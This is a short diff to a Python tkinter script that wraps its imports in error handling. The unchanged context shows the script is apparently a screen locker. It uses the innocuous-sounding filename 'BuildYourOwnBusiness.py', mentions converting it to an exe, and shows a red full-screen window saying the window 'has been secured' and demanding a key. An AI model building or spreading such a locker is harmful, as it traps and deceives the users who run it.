@@ -1,7 +1,10 @@
-import tkinter as tk
-import os
-import shutil
-import sys
+try:
+    import tkinter as tk
+    import os
+    import shutil
+    import sys
+except:
+    print("An error occurred! required module not installed. Try: pip install [module]")
 
 file = "BuildYourOwnBusiness.py" # If you convert the script to exe with pyinstaller or rename the file, change the name.
 
@@ -43,6 +46,7 @@ def create_widgets():
     label_text_2 = "This window has been secured and is no longer accessible. Please input the required key:"
     label = tk.Label(root, text=label_text_2, font=("Helvetica", 20), fg="#454545")
     label.place(x=screen_width // 2, y=400, anchor=tk.CENTER)
+
 
 root = tk.Tk()
 root.configure(background="#f40000")
